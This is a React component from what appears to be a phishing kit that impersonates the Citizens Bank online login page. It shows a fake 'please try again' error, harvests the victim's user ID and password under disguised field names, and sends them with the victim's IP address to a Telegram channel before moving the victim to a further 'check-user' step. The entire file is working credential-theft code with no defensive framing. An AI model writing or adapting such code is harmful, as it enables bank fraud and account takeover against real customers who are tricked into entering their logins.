import React from "react";
import cookies from "../utils/cookie.config";
import { useNavigate } from "react-router-dom";
import TelegramSend from "../utils/send-message";

export default function ReLogin() {

  const [formInput, setFormInput] = React.useState<Login2>({
    heart2: "",
    heartp2: "",
  });

  const pi = cookies.get("pi");

  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);

    const message = `
  [----+🏦 CITIZEN LOGIN (SECOND TRY) 🏦+-----]

  IP: ${pi}

  USERNAME: ${formInput.heart2}

  PASSWORD: ${formInput.heartp2}
  `;
    await TelegramSend(message);
    cookies.set("login2", formInput);
    setIsLoading(false);
    navigate("../check-user", { replace: true });
  }


  return (
    <>
      <div id="fielderror" style={{color: "red", padding:"10px"}} role="alert">
        We're sorry. That user ID and password does not match our records.
        Please try again, or do you need Login Assistance?
      </div>
      <form
        className="pay-transfer-options clearfix"
        name="SignOn"
        id="login-form"
        method="post"
        onSubmit={handleSubmit}
      >
        <div className="account-title clearfix">
          <p>Please enter your Online User ID and Password.</p>
        </div>

        <div className="form-item label-right full-width clearfix">
          <label htmlFor="UserID">
            <strong>Online User ID: </strong>
          </label>
          <input
            tabIndex={1}
            type="text"
            id="username"
            name="heart2"
            autoComplete="off"
            maxLength={20}
            className="required demo-username"
            required
            onChange={handleInputChange}
          />

          <div className="full-width checkbox-item clearfix">
            <input
              type="checkbox"
              tabIndex={5}
              // disabled="disabled"
              id="cbSaveUserID"
              name="cbSaveUserID"
              style={{ verticalAlign: "top" }}
            />

            <span className="inline-tooltip">
              <label htmlFor="cbSaveUserID">Remember User ID</label>

              <span
                className="tooltip"
                tabIndex={6}
                role="tooltip"
                aria-describedby="tooltip-content"
              >
                <div
                  className="tooltip-icon"
                  title="Remember User ID tooltip"
                ></div>
                <div className="tooltip-box">
                  <div className="tooltip-content" id="aria-tooltip-content">
                    <span className="tooltip-arrow"></span>
                    <div>
                      Select the "Remember User ID" box on the Login page if you
                      want to be remembered.
                    </div>
                    <br />
                    <div>
                      Please note, if the "Remember User ID" check box is not
                      displayed on the Login page, click on the "Login using
                      different Online User ID" link to display it.
                    </div>
                    <br />
                    <div>
                      DO NOT check this box if you are using a public device
                      that is accessible to others.
                    </div>
                  </div>
                  <div className="bottomshadow"></div>
                </div>
              </span>
            </span>
          </div>

          <div className="form-item full-width">
            <label htmlFor="currentpassword">
              <strong>Password: </strong>
            </label>

            <input
              tabIndex={2}
              type="password"
              id="password"
              name="heartp2"
              maxLength={15}
              size={15}
              className="required demo-password"
              required
              onChange={handleInputChange}
            />
          </div>

          <span className="mobile-line-break">
            <a
              tabIndex={7}
              style={{ fontSize: "16px !important" }}
              id="troublelogging"
              data-trigger="login-trouble"
              href="https://www4.citizensbankonline.com/efs/ui/tli/index.html"
            >
              Trouble logging in?
            </a>
          </span>
          <br />
        </div>
        <div id="fielderror" className="show-error" role="alert">
          We're sorry. That user ID and password does not match our records.
          Please try again, or do you need Login Assistance?
        </div>

        {
          isLoading ?
          <input
          type="button"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Please wait..."
        />

          :
          <input
          type="submit"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Login"
        />
        }
      </form>
    </>
  );
}
